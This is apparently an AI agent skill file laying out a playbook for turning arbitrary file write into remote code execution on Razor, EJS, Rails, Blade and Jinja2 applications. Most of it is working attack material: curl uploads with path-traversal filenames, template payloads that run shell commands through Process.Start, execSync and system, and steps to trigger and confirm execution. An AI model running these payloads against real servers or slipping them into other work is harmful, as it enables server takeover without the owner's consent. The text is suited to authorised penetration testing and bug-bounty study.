---
name: write-path-to-rce
description: Escalate arbitrary file write into code execution -- plant malicious Jinja2/EJS/Razor/Blade templates, overwrite framework view files, inject auto-loaded helpers. Covers Django, Flask, Express, Rails, Laravel, ASP.NET MVC. Use when you have arbitrary write (path traversal, upload) but cannot execute script extensions directly, and the framework auto-loads templates or code from predictable search paths.
---

# Arbitrary File Write -> RCE via View Engine Resolution

## Pattern
- You have arbitrary file write (path traversal, upload, report generation)
- The web server blocks direct requests to executable extensions
- The framework still resolves, compiles, or loads files internally from the filesystem

HTTP-layer request filtering and filesystem-level template lookup are different control planes. A framework can execute a written file through internal resolution even when direct URL access is blocked.

## Workflow

### 1. Confirm arbitrary write
```bash
# Write a canary file to a known location
curl -x localhost:8080 -k "https://target.com/upload" \
  -F "file=@canary.txt;filename=../../../tmp/canary.txt"

# Verify write
curl -x localhost:8080 -k "https://target.com/tmp/canary.txt"
```

**Checkpoint:** If canary file is not written, the write primitive is not confirmed. Stop here.

### 2. Identify framework and map resolution paths

```bash
# Check response headers for framework hints
curl -x localhost:8080 -k -sD- "https://target.com/" | rg -i "x-powered-by|server|x-aspnet"

# Trigger a 404 to see error page (often reveals framework + view paths)
curl -x localhost:8080 -k "https://target.com/nonexistent_route_xyz"
```

### 3. Write payload to searched path

#### ASP.NET MVC (Razor)
```bash
# View resolution: ~/Views/{controller}/{action}.cshtml, ~/Views/Shared/{action}.cshtml
# Write webshell to a view path
echo '@{ System.Diagnostics.Process.Start("cmd.exe", "/c whoami > C:\\inetpub\\wwwroot\\out.txt"); }' > payload.cshtml
curl -x localhost:8080 -k "https://target.com/upload" \
  -F "file=@payload.cshtml;filename=../Views/Shared/Error.cshtml"
# Trigger: visit any URL that renders the Error view (e.g., cause a 500)
```

#### Express.js (EJS/Pug)
```bash
# View resolution: views/{name}.ejs
echo '<%= process.mainModule.require("child_process").execSync("id").toString() %>' > payload.ejs
curl -x localhost:8080 -k "https://target.com/upload" \
  -F "file=@payload.ejs;filename=../views/index.ejs"
# Trigger: visit the route that renders index view
```

#### Ruby on Rails
```bash
# Zeitwerk autoload paths: app/controllers/, app/models/, app/helpers/, lib/
# Write a controller that executes on load
echo 'system("id > /tmp/pwned.txt")' > payload.rb
curl -x localhost:8080 -k "https://target.com/upload" \
  -F "file=@payload.rb;filename=../../../app/helpers/exploit_helper.rb"
# Trigger: any request that loads helpers (most routes)
```

#### Laravel (Blade)
```bash
# View resolution: resources/views/{name}.blade.php
echo '{!! system("id") !!}' > payload.blade.php
curl -x localhost:8080 -k "https://target.com/upload" \
  -F "file=@payload.blade.php;filename=../resources/views/welcome.blade.php"
# Trigger: visit / (default welcome route)
```

#### Django/Flask (Jinja2)
```bash
# Template dirs: templates/
echo '{{ "".__class__.__mro__[1].__subclasses__() }}' > payload.html
# Use this to enumerate classes, then find os.popen or subprocess for RCE
```

### 4. Trigger resolution and verify execution
```bash
# Trigger the route that renders the overwritten template
curl -x localhost:8080 -k "https://target.com/target-route"

# Verify execution via OOB callback or file creation
curl -x localhost:8080 -k "https://target.com/out.txt"
```

**Checkpoint:** Confirm execution with a benign command (whoami, id) or OOB callback. Do not proceed with destructive payloads until execution is confirmed.

## Detection Signals
```bash
# Error messages disclosing view search paths
rg "ViewEngine|Could not find view|template not found" http_requests/

# Framework file lookups (if you have strace/procmon access)
strace -e trace=open,openat -p <pid> 2>&1 | grep -i "views\|templates"
```

## Chain With
- `apache-confusion-attacks`
- `race-condition-single-packet`
- `parser-differential-bypass`

## References
- https://lab.ctbb.show/research/asp-net-mvc-view-engine-search-patterns
- https://lab.ctbb.show/research/write-path-traversal-to-RCE-art-department
